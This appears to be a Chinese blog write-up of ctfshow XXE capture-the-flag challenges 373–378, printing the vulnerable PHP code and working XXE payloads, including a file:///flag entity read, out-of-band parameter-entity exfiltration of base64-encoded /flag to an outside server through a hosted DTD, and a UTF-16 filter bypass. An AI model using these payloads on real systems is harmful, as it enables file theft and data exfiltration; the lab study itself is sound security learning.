---
title: ctfshow web入门(xxe)
categories: ctfshow
---

# 前言
xxe 也学习过一点，正好手边有台服务器，开搞开搞

首先推荐好文章：[XML与xxe注入基础知识](https://www.cnblogs.com/backlion/p/9302528.html)

---
# 373
```php
error_reporting(0); 
libxml_disable_entity_loader(false);   //禁用加载外部实体的能力
$xmlfile = file_get_contents('php://input'); 
if(isset($xmlfile)){ 
    $dom = new DOMDocument();  //创建内部类Document对象
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); //通过解析一个 XML 标签字符串来组成该文档
    $creds = simplexml_import_dom($dom); //把 DOM 节点转换为 SimpleXMLElement 对象
    $ctfshow = $creds->ctfshow; 
    echo $ctfshow; 
}
```
<!--more-->

payload:
```
<!DOCTYPE cys[
<!ENTITY xxe SYSTEM "file:///flag">
]>
<test>
<ctfshow>&xxe;</ctfshow>
</test>
```

---
# 374(嵌套调用)
```php
error_reporting(0); 
libxml_disable_entity_loader(false); 
$xmlfile = file_get_contents('php://input'); 
if(isset($xmlfile)){ 
    $dom = new DOMDocument(); 
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
} 
highlight_file(__FILE__);  
```

可以看到没有回显，所以需要外带出来数据

使用`参数实体`方便

`参数实体有几个特性`，这几个特性也决定了它能被利用的程度：

-  只能在DTD内部 

- 立即引用

- 实体嵌套

![](https://img-blog.csdnimg.cn/20210420190749973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
服务器构造 test.dtd
```
<!ENTITY % dtd   "<!ENTITY &#37; xxe SYSTEM 'http://1.15.66.132/%file;'>">
```

`嵌套的 %` 需要写成 `&#37;` 也可写为16进制 `&#x25;` 不然大概率出错

构造
```
<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % hack SYSTEM "http://1.15.66.132/test.dtd">
%hack;
%dtd;
%xxe;
```

调用过程：

>参数实体 hack 调用外部实体 test.dtd，然后又调用参数实体 dtd，接着调用参数实体 xxe ,再调用file

此时我就纳闷了，为什么要在test.dtd中嵌套两层，`直接一层不行吗？`经过实操不行，这里暂时有点不理解

还有另一种写法 :


Test.dtd
```
<!ENTITY % dtd   "<!ENTITY xxe SYSTEM 'http://1.15.66.132/%file;'>">
```

构造：
```
<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % hack SYSTEM "http://1.15.66.132/test.dtd">
%hack;
%dtd;
]>
<cys>&xxe;</cys>
```
调用过程：
>参数实体hack调用外部实体test.dtd，然后又调用参数实体dtd，接着调用命名实体xxe

![](https://img-blog.csdnimg.cn/20210420191100987.png#pic_center)

---
# 375-376

```php
error_reporting(0); 
libxml_disable_entity_loader(false); 
$xmlfile = file_get_contents('php://input'); 
if(preg_match('/<\?xml version="1\.0"/', $xmlfile)){ 
    die('error'); 
} 
if(isset($xmlfile)){ 
    $dom = new DOMDocument(); 
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
} 
highlight_file(__FILE__);
```

过滤声明而已，同上


---
# 377(编码绕过)
```php
error_reporting(0); 
libxml_disable_entity_loader(false); 
$xmlfile = file_get_contents('php://input'); 
if(preg_match('/<\?xml version="1\.0"|http/i', $xmlfile)){ 
    die('error'); 
} 
if(isset($xmlfile)){ 
    $dom = new DOMDocument(); 
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
} 
highlight_file(__FILE__);  
```

过滤了 http

这里看一下utf-8 与 utf-16 的不同

utf-8 :

![](https://img-blog.csdnimg.cn/20210420191305514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
utf-16 :

![](https://img-blog.csdnimg.cn/20210420191321356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
改一下加密方式就行了，requests发包


---
# 378
不知道怎么造

![](https://img-blog.csdnimg.cn/20210420191345680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

